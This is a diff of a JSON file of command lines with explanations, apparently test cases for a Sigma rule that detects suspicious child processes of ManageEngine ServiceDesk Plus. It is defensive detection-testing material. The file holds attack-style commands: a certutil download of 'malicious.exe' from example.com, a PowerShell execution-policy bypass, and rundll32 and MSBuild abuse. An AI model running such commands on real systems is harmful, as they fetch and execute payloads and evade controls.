@@ -1,14 +1,22 @@
 [
   {
-    "output": "cmd.exe /c powershell.exe -nop -ep bypass",
-    "explanation": "This command is already a valid test case for the Sigma rule. It represents a suspicious child process (PowerShell) launched from a parent process (cmd.exe), which could be flagged if the parent process is associated with ManageEngine ServiceDesk."
+    "output": "cmd.exe /c start \"\" \"C:\\\\Windows\\\\System32\\\\notepad.exe\"",
+    "explanation": "This command launches notepad.exe, which is included in the Sigma rule's Image|endswith list. It is a legitimate test case for the rule since it simulates a suspicious child process of the Manage Engine ServiceDesk Plus Java service."
   },
   {
-    "output": "MSBuild.exe C:\\path\\to\\malicious.xml",
-    "explanation": "This command is already a valid test case for the Sigma rule. MSBuild.exe is not listed in the rule's suspicious child process list, but it can be used to execute malicious payloads and may still be flagged if the parent process is associated with ManageEngine ServiceDesk."
+    "output": "powershell.exe -Command \"Start-Process -FilePath 'C:\\\\Windows\\\\System32\\\\whoami.exe' -NoNewWindow -Wait\"",
+    "explanation": "This command launches whoami.exe using PowerShell, which is included in the Sigma rule's Image|endswith list. It is a valid test case for the rule as it simulates a suspicious child process of the Manage Engine ServiceDesk Plus Java service."
   },
   {
-    "output": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();",
-    "explanation": "This command is already a valid test case for the Sigma rule. It represents a suspicious child process (rundll32.exe) that is not explicitly listed in the rule but may be flagged if the parent process is associated with ManageEngine ServiceDesk."
+    "output": "C:\\\\Windows\\\\System32\\\\cmd.exe /c C:\\\\Windows\\\\System32\\\\certutil.exe -urlcache -split http://example.com/malicious.exe malicious.exe",
+    "explanation": "This command invokes certutil.exe, which is included in the Sigma rule's Image|endswith list. It is a valid test case for the rule as it simulates a suspicious child process of the Manage Engine ServiceDesk Plus Java service."
+  },
+  {
+    "output": "C:\\\\Windows\\\\System32\\\\wscript.exe C:\\\\Windows\\\\System32\\\\cscript.exe",
+    "explanation": "This command launches cscript.exe via wscript.exe, both of which are included in the Sigma rule's Image|endswith list. It is a valid test case for the rule as it simulates a suspicious child process of the Manage Engine ServiceDesk Plus Java service."
+  },
+  {
+    "output": "C:\\\\Windows\\\\System32\\\\bash.exe -c \"echo Test\"",
+    "explanation": "This command invokes bash.exe, which is included in the Sigma rule's Image|endswith list. It is a valid test case for the rule as it simulates a suspicious child process of the Manage Engine ServiceDesk Plus Java service."
   }
 ]
